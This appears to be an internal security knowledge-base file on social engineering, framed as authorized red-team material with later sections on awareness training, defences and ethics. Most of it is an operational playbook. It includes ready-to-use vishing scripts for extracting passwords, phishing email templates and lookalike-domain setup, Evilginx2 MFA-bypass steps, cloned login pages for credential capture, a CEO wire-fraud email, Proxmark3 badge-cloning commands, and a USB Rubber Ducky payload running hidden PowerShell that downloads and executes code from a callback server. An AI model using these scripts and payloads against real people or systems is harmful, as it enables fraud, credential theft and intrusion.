# Social Engineering Framework

> Rush Seed — Palace Security Knowledge Base
> Classification: OFFENSIVE/DEFENSIVE — FOUNDER EYES ONLY
> Version: 1.0 | Created: 2026-03-09

---

## 1. Social Engineering Philosophy

Social engineering exploits the one vulnerability you can never fully patch: human nature. Every security system ultimately depends on a human making the right decision under pressure. Rush's principle: **the strongest firewall means nothing if someone holds the door open.**

### 1.1 Why Social Engineering Works

- **Trust is the default** — Humans are wired to cooperate and trust authority
- **Fear overrides logic** — Urgency and consequences short-circuit critical thinking
- **Cognitive biases are universal** — Anchoring, authority bias, reciprocity, social proof
- **People want to be helpful** — Especially in customer-facing and support roles
- **Security fatigue is real** — Too many alerts, policies, and warnings desensitize users

### 1.2 The Social Engineering Kill Chain

| Phase | Action | Goal |
|-------|--------|------|
| 1. Target Research | OSINT on individuals/roles | Identify human attack surface |
| 2. Pretext Development | Build believable story | Create trust framework |
| 3. Engagement | Initial contact | Establish rapport |
| 4. Exploitation | Execute the attack | Achieve objective |
| 5. Extraction | Obtain credentials/access/data | Capture the payload |
| 6. Disengagement | Clean exit | Leave no suspicion trail |

---

## 2. Pretexting — Building Believable Stories

### 2.1 Pretext Architecture

A pretext is a fabricated scenario designed to extract information or access. The best pretexts are:

- **Plausible** — Could realistically happen in the target's environment
- **Verifiable** — Contains enough true details to pass basic scrutiny
- **Time-pressured** — Creates urgency that discourages verification
- **Authority-backed** — Leverages organizational hierarchy
- **Emotionally charged** — Triggers fear, excitement, or helpfulness

### 2.2 Common Pretext Categories

**IT Support:**
```
Scenario: "Hi, this is Mike from IT. We've detected unusual login activity
on your account and need to verify your identity to prevent a lockout."

Why it works:
- IT is trusted
- Account security is urgent
- Users fear being locked out
- Most users can't verify IT staff identity
```

**Vendor/Supplier:**
```
Scenario: "This is Sarah from [known vendor]. We're updating our payment
processing system and need to verify the current bank details we have on
file for your company."

Why it works:
- Vendor relationships are routine
- Financial processes are complex
- AP departments handle many vendors
- Verification seems like due diligence
```

**Executive/Authority:**
```
Scenario: "This is [CEO name]'s assistant. They need [sensitive document]
for an urgent board meeting in 30 minutes. Can you email it to this
address?"

Why it works:
- Authority bias — people comply with executives
- Urgency prevents verification
- "Assistant" is harder to verify than the executive
- People fear consequences of refusing
```

**New Employee:**
```
Scenario: "Hi, I just started in [department] this week. My laptop hasn't
been set up yet and I need to access [system] for a meeting in an hour.
Can you help?"

Why it works:
- People want to be helpful to newcomers
- IT onboarding is often slow
- Nobody remembers every new hire
- Helpfulness overrides security policy
```

**Physical/Delivery:**
```
Scenario: Wearing a delivery uniform, carrying packages. "I have an
urgent delivery for [real employee name]. They said to bring it directly
to their office."

Why it works:
- Delivery people are routine and invisible
- Package for a real person adds credibility
- Urgency reduces scrutiny
- People don't challenge service workers
```

### 2.3 Pretext Research Requirements

Before any engagement, gather:

```
[ ] Target organization structure (org chart)
[ ] Key personnel names and roles
[ ] Internal terminology and jargon
[ ] Technology platforms used
[ ] Physical office locations and layout
[ ] Vendor and partner relationships
[ ] Recent events (mergers, outages, moves)
[ ] Internal communication patterns (email format, tools)
[ ] Dress code and badge appearance
[ ] Reception and security procedures
```

---

## 3. Phishing Campaigns

### 3.1 Phishing Types

| Type | Vector | Targeting | Sophistication |
|------|--------|-----------|---------------|
| Mass Phishing | Email blast | Broad | Low |
| Spear Phishing | Targeted email | Individual/team | Medium-High |
| Whaling | Executive-targeted | C-suite | Very High |
| Clone Phishing | Cloned legitimate email | Previous recipients | Medium |
| Lateral Phishing | From compromised account | Internal | Very High |
| Smishing | SMS/text | Mobile users | Low-Medium |
| Vishing | Voice call | Anyone | Medium |

### 3.2 Phishing Email Crafting

**Subject Line Psychology:**
```
High-Open-Rate Patterns:
- "Action Required: [specific system] password expires in 24 hours"
- "Your [company] account has been flagged for review"
- "Shared document: Q4 Compensation Review"
- "[Real colleague name] shared a file with you"
- "Meeting update: [real upcoming meeting] location changed"
- "Invoice #[random]: Payment overdue - immediate action required"
- "IT Notice: Mandatory security update required"
- "Your package delivery failed — reschedule now"

What makes these effective:
- Urgency + specificity
- Reference to real systems/people/events
- Consequences for inaction
- Mimics legitimate notifications
```

**Email Body Best Practices:**
```
1. Match the sender's real email format
   - Same signature block style
   - Same greeting patterns
   - Same font and formatting

2. Include legitimate-looking details
   - Real company logos (scraped from website)
   - Real addresses and phone numbers
   - Ticket/reference numbers

3. Single clear call-to-action
   - "Click here to verify your account"
   - "Download the attached document"
   - "Reply with your updated information"

4. Create a sense of urgency
   - "Within 24 hours" or "by end of day"
   - "Failure to comply will result in..."
   - "This is the final reminder"

5. Pre-empt suspicion
   - "If you didn't request this, please contact IT"
   - Include a fake "this email was scanned" footer
   - Use the company's actual disclaimer text
```

### 3.3 Phishing Infrastructure

**Domain Setup:**
```bash
# Register lookalike domains
# target.com → target-secure.com, targets.com, target.co,
# tarqet.com, target-it.com, target-sso.com

# Set up SPF, DKIM, DMARC for deliverability
# DNS records for phishing domain:
# TXT "v=spf1 ip4:PHISHING_IP ~all"
# TXT "v=DKIM1; k=rsa; p=..."
# TXT "v=DMARC1; p=none; rua=..."

# Use GoPhish for campaign management
# Install GoPhish
wget https://github.com/gophish/gophish/releases/latest/...
./gophish

# Or use King Phisher, Evilginx2, or Modlishka
```

**Landing Page Cloning:**
```bash
# Clone target login page
wget -mkEpnp https://login.target.com

# Use httrack for more complex sites
httrack "https://login.target.com" -O ./clone

# Modify the cloned page:
# 1. Change form action to your capture server
# 2. Add credential logging JavaScript
# 3. Redirect to real site after capture (reduces suspicion)
# 4. Match SSL certificate (use Let's Encrypt on lookalike domain)
```

**Evilginx2 (Advanced — MFA Bypass):**
```bash
# Evilginx2 acts as a transparent proxy
# Captures session tokens AFTER MFA authentication

# Install
go install github.com/kgretzky/evilginx2@latest

# Configure phishlet for target
phishlets hostname target login.target-secure.com

# Set up lure
lures create target
lures edit 0 redirect_url https://target.com/dashboard

# Start
phishlets enable target
```

### 3.4 Campaign Execution

```
Pre-Launch Checklist:
[ ] Landing page matches target perfectly
[ ] Email passes SPF/DKIM/DMARC checks
[ ] Test email delivery to multiple providers
[ ] Credential capture and logging working
[ ] Redirect after capture working
[ ] Campaign tracking (who clicked, who submitted)
[ ] Send time optimized (Tuesday-Thursday, 9-11 AM)
[ ] Target list validated and segmented
[ ] Legal authorization confirmed (scope document)
```

**Timing Strategy:**
```
Best days: Tuesday, Wednesday, Thursday
Best times: 9:00-11:00 AM, 1:30-3:00 PM (target's timezone)
Worst: Monday morning (email overload), Friday afternoon (checking out)

Special opportunities:
- Day after a real IT outage (IT email about "follow-up" is natural)
- Right before payday (compensation/payroll themes)
- During company events (event registration themes)
- After public security incidents (security update themes)
```

---

## 4. Vishing (Voice Phishing)

### 4.1 Vishing Methodology

**Call Preparation:**
```
1. Research the target thoroughly
   - Full name, title, department
   - Direct phone number if possible
   - Known colleagues and managers
   - Current projects or initiatives

2. Prepare your pretext script
   - Opening line (identity + reason for call)
   - Build rapport (2-3 minutes of small talk)
   - Pivot to request (natural transition)
   - Handle objections (pre-planned responses)
   - Close and disengage (leave no suspicion)

3. Set up your calling environment
   - Caller ID spoofing (if authorized)
   - Background noise appropriate to pretext
   - Recording (with legal authorization)
   - Note-taking ready
```

**Example Vishing Script — IT Helpdesk:**
```
[Ring... target answers]

"Hi, is this [Target Name]? Great, this is Kevin from the IT helpdesk.
How are you doing today?"

[Small talk — 30 seconds]

"So the reason I'm calling — we're doing a mandatory security upgrade
on all accounts this week. You should have gotten an email about it,
but I know people are busy. I just need to verify your account real
quick so I can push the update through on my end."

"Can you confirm the email address on your account?"
[They provide it — this builds a pattern of compliance]

"Perfect. And your employee ID number?"
[They provide it — deeper information]

"Great. Now, I need to temporarily reset your password to push the
update. I'm going to set it to a temporary one, and then you'll
change it when you log in. Can you tell me your current password
first so I can verify it's you?"

[If they resist]
"I totally understand the concern — that's actually great security
awareness! Let me give you my extension so you can call me back
through the main helpdesk line to verify. It's extension 4237."

[Extension 4237 is YOUR controlled voicemail/number]
```

### 4.2 Voice Manipulation Techniques

- **Authority tone** — Confident, slightly rushed, implies importance
- **Helpfulness tone** — Warm, patient, "I'm here to help you"
- **Urgency tone** — Slightly stressed, "I need this resolved now"
- **Casual tone** — Relaxed, insider, "Yeah, IT stuff, you know how it is"

**Key Principles:**
- Mirror the target's speaking pace and energy
- Use the target's name frequently (builds rapport)
- Ask easy questions first (build compliance pattern)
- Escalate requests gradually
- If challenged, validate their concern ("Great security awareness!")
- Always have a fallback ("Let me check with my supervisor and call back")

### 4.3 Caller ID Spoofing

```bash
# Tools for authorized pentesting:
# - SpoofCard (commercial service)
# - VoIP providers with custom caller ID
# - Asterisk PBX with custom SIP headers

# Asterisk dialplan example (authorized testing only):
# [outbound]
# exten => _X.,1,Set(CALLERID(num)=TARGET_IT_NUMBER)
# exten => _X.,1,Set(CALLERID(name)=IT Helpdesk)
# exten => _X.,n,Dial(SIP/${EXTEN}@provider)
```

---

## 5. Physical Social Engineering

### 5.1 Physical Access Techniques

**Tailgating/Piggybacking:**
```
Technique: Follow an authorized person through a secured door

Setup:
- Carry large boxes or equipment (both hands full)
- Wear a visitor badge (real or fake)
- Time entry with a group (morning arrival, post-lunch)
- Appear to struggle with a heavy load near a secured door
- Wait for someone to hold the door

Success factors:
- Confidence (you belong here)
- Props (equipment, boxes, laptop bag)
- Timing (rush hours = less scrutiny)
- Appearance (match dress code)
```

**Impersonation Pretexts:**
| Role | Props Needed | Access Level |
|------|-------------|--------------|
| Delivery driver | Uniform, clipboard, packages | Lobby, mailroom |
| IT contractor | Laptop bag, tools, work order | Server rooms, offices |
| Fire inspector | Clipboard, badge, camera | Everywhere |
| Cleaning crew | Uniform, cleaning cart | After hours, everywhere |
| Job candidate | Resume, professional attire | Lobby, meeting rooms |
| Vendor rep | Business cards, demo materials | Meeting rooms, offices |
| Building maintenance | Tools, work order, hi-vis vest | Utility areas, rooftop |

### 5.2 Badge and Access Card Attacks

```
Badge Cloning (authorized testing):
1. Long-range RFID reader (Proxmark3, HID cloner)
2. Position near badge-in entry point
3. Capture card data as employee badges in
4. Clone to blank card
5. Test cloned badge on lower-security entry first

Common card technologies:
- HID Prox (125kHz) — Easily clonable
- HID iCLASS (13.56MHz) — Harder but possible
- MIFARE Classic — Known vulnerabilities
- MIFARE DESFire — More secure, harder to clone
- Smart cards with PKI — Very difficult to clone

Proxmark3 commands:
# Read low-frequency card
lf search
lf hid read

# Clone to T5577
lf hid clone [card data]

# Read high-frequency card
hf search
hf mf autopwn
```

### 5.3 USB Drop Attacks

```
Concept: Leave USB drives in target organization's parking lot, lobby,
or common areas. Curiosity drives people to plug them in.

Setup (authorized testing):
1. Label USBs convincingly:
   - "Salary Data 2026"
   - "Layoff List - Confidential"
   - "HR - Do Not Distribute"
   - Target company logo on USB

2. Payload options:
   - Rubber Ducky scripts (HID attack)
   - Autorun executables (if enabled)
   - Weaponized Office documents
   - HTML files that phone home
   - Tracking pixel documents

3. Track who plugs in:
   - Unique IDs per USB
   - Callback to controlled server
   - Log time, machine name, user

Rubber Ducky payload example:
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://callback.server/payload')"
ENTER
```

---

## 6. Psychological Principles

### 6.1 Cialdini's Principles of Influence

**1. Reciprocity** — Give something first, then ask
```
"I fixed that printer issue you reported. By the way, I need your
help with something — can you test logging into this new system?"
```

**2. Commitment/Consistency** — Get small yeses before the big ask
```
"Can you confirm your name? [yes] Your department? [yes] Your employee
ID? [yes] Great, and your password for verification? [compliance pattern]"
```

**3. Social Proof** — Others are doing it
```
"Everyone in your department has already completed this security
verification. You're the last one — I just need your credentials
to finish the update."
```

**4. Authority** — Power and expertise
```
"This is a directive from the CISO. All accounts need to be verified
by end of day. I've been authorized to collect this information."
```

**5. Liking** — Build rapport first
```
Compliment their work, find common ground, mirror their communication
style, use their name, be warm and personable.
```

**6. Scarcity/Urgency** — Limited time/availability
```
"This security patch window closes in 30 minutes. If your account
isn't verified by then, it'll be locked until Monday."
```

### 6.2 Cognitive Biases Exploited

| Bias | Description | Exploitation |
|------|-------------|-------------|
| Authority Bias | Trust people in authority | Impersonate executives, IT, security |
| Anchoring | First info shapes decisions | Lead with alarming claim, then "easy fix" |
| Bandwagon | Follow the crowd | "Everyone else already did this" |
| Loss Aversion | Fear losing > desire gaining | "Your account will be locked/deleted" |
| Confirmation Bias | Believe what fits beliefs | Align pretext with target's expectations |
| Dunning-Kruger | Overestimate own ability | Target believes they can't be tricked |
| Halo Effect | One good trait = all good | Professional appearance = trustworthy |
| Availability Heuristic | Recent events feel likely | Reference recent breaches/incidents |

---

## 7. Email-Based Social Engineering (Advanced)

### 7.1 Business Email Compromise (BEC)

```
Scenario: CEO impersonation for wire transfer

From: ceo@target-corp.com (spoofed or compromised)
To: CFO or AP department
Subject: Urgent — Confidential Wire Transfer

"I'm in a meeting and can't call. I need you to process an urgent
wire transfer for an acquisition we're closing today. Please send
$47,500 to the following account:

Bank: [details]
Account: [details]
Reference: Project Eagle

This is confidential — don't discuss with anyone until the
announcement next week. Please confirm when sent."

Why it works:
- CEO authority
- Confidentiality prevents verification
- Urgency prevents process
- Reference to real-sounding project
- Specific enough to seem planned
```

### 7.2 Pretexting via Email Thread Hijacking

```
Technique: Insert yourself into an existing email thread

1. Compromise one participant's email (or obtain forwarded thread)
2. Reply-all with modified content
3. Include malicious link or attachment
4. Recipients trust the thread context

From: compromised-user@target.com
Subject: RE: RE: RE: Q4 Budget Review — Updated Figures
"Attached is the updated spreadsheet with the final numbers.
[malicious-attachment.xlsm]"
```

### 7.3 Watering Hole Attacks

```
Concept: Compromise a website the target ALREADY visits

1. Identify target's frequently visited sites
   - Industry forums, news sites, vendor portals
   - Professional association websites
   - Conference registration pages

2. Compromise the watering hole site
   - Inject malicious JavaScript
   - Serve exploit kit to specific IP ranges
   - Add fake login prompt
   - Redirect to credential harvester

3. Wait for targets to visit naturally
   - No suspicious emails
   - Victims go to a site they trust
   - Harder to detect and attribute
```

---

## 8. Defense and Awareness Training

### 8.1 Building a Security Culture

**Training Program Structure:**
```
Module 1: What is Social Engineering? (30 min)
- Real examples and case studies
- Why smart people fall for it
- The attacker's perspective

Module 2: Email Security (45 min)
- Identifying phishing indicators
- Hovering over links before clicking
- Verifying unexpected attachments
- Reporting suspicious emails
- Real vs. spoofed sender analysis

Module 3: Phone Security (30 min)
- Verification procedures for callers
- What to NEVER share over phone
- How to politely refuse and escalate
- Real examples of vishing attacks

Module 4: Physical Security (30 min)
- Tailgating prevention
- Badge security
- Visitor procedures
- USB device policies
- Clean desk policy

Module 5: Incident Response (15 min)
- What to do if you suspect social engineering
- Who to contact immediately
- Preserving evidence
- No blame culture — reporting is rewarded
```

### 8.2 Phishing Simulation Program

```
Cadence: Monthly simulations with escalating difficulty

Month 1-3: Basic phishing (obvious signs)
- Generic subject lines
- Unknown senders
- Obvious URL mismatches
- Grammar errors

Month 4-6: Intermediate phishing
- Spoofed internal sender
- Realistic branding
- Subtle URL differences
- Relevant content

Month 7-9: Advanced phishing
- Spear phishing with personal details
- Thread hijacking simulations
- Targeted by department
- Current event themes

Month 10-12: Expert level
- Lookalike domains with SSL
- MFA phishing simulations
- Combined email + phone (vishing follow-up)
- Executive impersonation

Metrics to Track:
- Click rate (target: <5%)
- Report rate (target: >70%)
- Credential submission rate (target: <2%)
- Time to report (target: <15 minutes)
- Repeat offenders (targeted additional training)
```

### 8.3 Red Flags Checklist (User Training)

```
Email Red Flags:
[ ] Unexpected email from unknown sender
[ ] Urgency or threatening language
[ ] Request for credentials or sensitive info
[ ] Links that don't match the displayed text
[ ] Attachments from unexpected sources
[ ] Spoofed sender address (close but not exact)
[ ] Generic greeting ("Dear Customer")
[ ] Grammar/spelling errors (but advanced attacks are perfect)
[ ] Request to bypass normal procedures
[ ] "Don't tell anyone" / confidentiality pressure

Phone Red Flags:
[ ] Caller asks for password or credentials
[ ] Caller creates extreme urgency
[ ] Caller claims authority you can't verify
[ ] Caller asks you to install software
[ ] Caller asks you to bypass security procedures
[ ] Caller gets aggressive when questioned
[ ] Caller has limited knowledge of internal processes
[ ] Number doesn't match known company numbers

Physical Red Flags:
[ ] Unknown person following through secured doors
[ ] Someone without a badge in secured areas
[ ] Unfamiliar "contractors" without escort
[ ] USB drives found in public areas
[ ] Requests to hold doors or bypass badge readers
[ ] Unfamiliar people asking about systems or personnel
```

---

## 9. Organizational Defenses

### 9.1 Technical Controls

```
Email:
- SPF, DKIM, DMARC (reject policy)
- Email gateway with URL rewriting and sandboxing
- External email banner/warning
- Attachment sandboxing
- Domain lookalike monitoring
- Impersonation protection (display name matching)

Phone:
- Caller verification procedures
- Callback on trusted numbers only
- No credential requests via phone (policy)
- Recording and monitoring for sensitive lines

Physical:
- Anti-tailgating measures (mantraps, turnstiles)
- Visitor management system
- Badge-in/badge-out logging
- Security cameras at entry points
- Clean desk policy enforcement
- USB port blocking via endpoint management

Web:
- Web filtering/proxy
- SSL inspection
- Browser isolation for high-risk sites
- Credential phishing detection
```

### 9.2 Process Controls

```
- Dual authorization for financial transactions
- Out-of-band verification for sensitive requests
- Defined escalation procedures
- Regular access reviews
- Incident reporting hotline (anonymous OK)
- No-blame reporting culture
- Vendor verification procedures
- Change management for IT requests
```

### 9.3 Measuring Security Culture

```
Key Metrics:
1. Phishing simulation click rate (monthly)
2. Phishing report rate (monthly)
3. Mean time to report (MTTR)
4. Security incident reports (voluntary)
5. Training completion rate
6. Repeat offender rate
7. Badge tailgating incidents
8. Clean desk audit results

Maturity Levels:
Level 1: Unaware — No training, high click rates (>30%)
Level 2: Aware — Basic training, moderate click rates (15-30%)
Level 3: Engaged — Regular training + simulations (<15%)
Level 4: Vigilant — Culture of reporting, low click rates (<5%)
Level 5: Resilient — Proactive reporting, near-zero success rate (<1%)
```

---

## 10. Legal and Ethical Considerations

### 10.1 Authorization Requirements

- **Written scope document** — Explicitly authorizing social engineering tests
- **Target list** — Who can be tested, who is excluded
- **Boundaries** — What pretexts are approved, what is off-limits
- **Escalation contacts** — If someone becomes distressed
- **Emergency stop** — Immediate halt procedure
- **Data handling** — What happens to captured credentials
- **Reporting** — Who receives results, how they're protected

### 10.2 Ethical Boundaries

```
ALWAYS:
- Have written authorization before any social engineering test
- Protect captured credentials (encrypt, delete after reporting)
- Report findings to improve security, not to shame individuals
- Stop immediately if someone becomes distressed
- Anonymize individuals in reports (identify departments, not people)
- Provide constructive feedback and training

NEVER:
- Use captured credentials for unauthorized access
- Target individuals for harassment or embarrassment
- Create physical safety concerns
- Impersonate law enforcement
- Exploit personal relationships or emotional vulnerabilities
- Test outside the authorized scope
- Share captured data with unauthorized parties
```

---

## 11. Social Engineering Toolkit (SET)

```bash
# Social Engineering Toolkit (Python-based)
setoolkit

# Menu options:
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
      1) Perform a Mass Email Attack
      2) Create a FileFormat Payload
      3) Create a Social-Engineering Template
   2) Website Attack Vectors
      1) Java Applet Attack Method
      2) Metasploit Browser Exploit Method
      3) Credential Harvester Attack Method
      4) Tabnabbing Attack Method
      5) Web Jacking Attack Method
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) QRCode Generator Attack Vector

# Credential Harvester Example:
# SET > 1 > 2 > 3 > 2 (Site Cloner)
# Enter URL to clone: https://login.target.com
# SET clones the page and starts a listener
# Captured credentials logged to reports/
```

---

## 12. Rush's Social Engineering Rules

```
1. ALWAYS have written authorization. No exceptions.
2. Research first. The pretext is only as good as your intel.
3. Stay calm. Confidence is your most powerful tool.
4. Have a fallback for every objection.
5. Know when to abort. Pushing too hard blows the engagement.
6. Never shame the target. They're helping you find weaknesses.
7. Document everything. Screenshots, recordings (if authorized), notes.
8. Debrief after every engagement. What worked, what didn't, why.
9. Report constructively. "Here's how to fix this" > "Look how easy that was."
10. Train, don't blame. The goal is a more secure organization.
```

---

*Rush knows that the strongest encryption means nothing if someone willingly hands over the keys. The human element is the attack surface that never gets fully patched — but it can be hardened with awareness, training, and a culture that rewards vigilance over compliance.*
